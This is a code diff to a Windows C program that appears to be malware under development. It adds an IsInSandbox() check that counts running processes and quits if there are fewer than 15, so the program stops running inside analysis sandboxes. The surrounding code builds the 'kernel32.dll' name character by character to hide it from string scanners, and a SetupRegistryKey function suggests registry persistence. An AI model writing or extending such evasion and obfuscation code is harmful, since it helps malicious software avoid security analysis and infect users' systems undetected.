@@ -434,11 +434,8 @@ int SetupRegistryKey(const char* execPath)
 	return 0;
 }
 
-int CALLBACK
-WinMain(HINSTANCE hInstance,
-		HINSTANCE hPrevInstance,
-		LPSTR lpCmdLine,
-		int nCmdShow)
+int
+IsInSandbox(void)
 {
 	DWORD processList[1024];
 	DWORD cbNeeded;
@@ -446,9 +443,17 @@ WinMain(HINSTANCE hInstance,
 
 	if ( !EnumProcesses(processList, sizeof(processList), &cbNeeded) )
 	{
+#if DEBUG
+		OutputDebugStringA("[ERROR] Could not enumerate process list.");
+#endif		
 		return 1;
 	}
 	numProcesses = cbNeeded / sizeof(DWORD);
+	if ( numProcesses < 15 )
+	{
+		return 1;
+	}
+	
 	for ( unsigned int i = 0 ; i < numProcesses ; i++ )
 	{
 		DWORD processId = processList[i];
@@ -458,7 +463,7 @@ WinMain(HINSTANCE hInstance,
 		}
 
 		HANDLE processHandle = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-									   FALSE, processId);
+											FALSE, processId);
 		if ( NULL != processHandle )
 		{
 			HMODULE hModule;
@@ -468,22 +473,43 @@ WinMain(HINSTANCE hInstance,
 			{
 				char processName[MAX_PATH];
 				GetModuleBaseNameA( processHandle, hModule, processName, sizeof(processName)/sizeof(char));
-
+#if DEBUG
 				OutputDebugStringA(processName);
 				OutputDebugStringA("\n");
+#endif
 			}
 			else
 			{
-				
+#if DEBUG
+				char buffer[256];
+				sprintf_s(buffer, 256, "[WARNING] Could not enumarate the process modules for processId: %d\n", processId);
+				OutputDebugStringA(buffer);
+#endif
 			}
 		}
 		else
 		{
-
+#if DEBUG
+			char buffer[256];
+			sprintf_s(buffer, 256, "[WARNING] Could not get a process handle for processId: %d\n", processId);
+			OutputDebugStringA(buffer);
+#endif
 		}
 	}
 	
 	return 0;
+}
+
+int CALLBACK
+WinMain(HINSTANCE hInstance,
+		HINSTANCE hPrevInstance,
+		LPSTR lpCmdLine,
+		int nCmdShow)
+{
+	if ( IsInSandbox() )
+	{
+		return 1;
+	}
 	
  	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
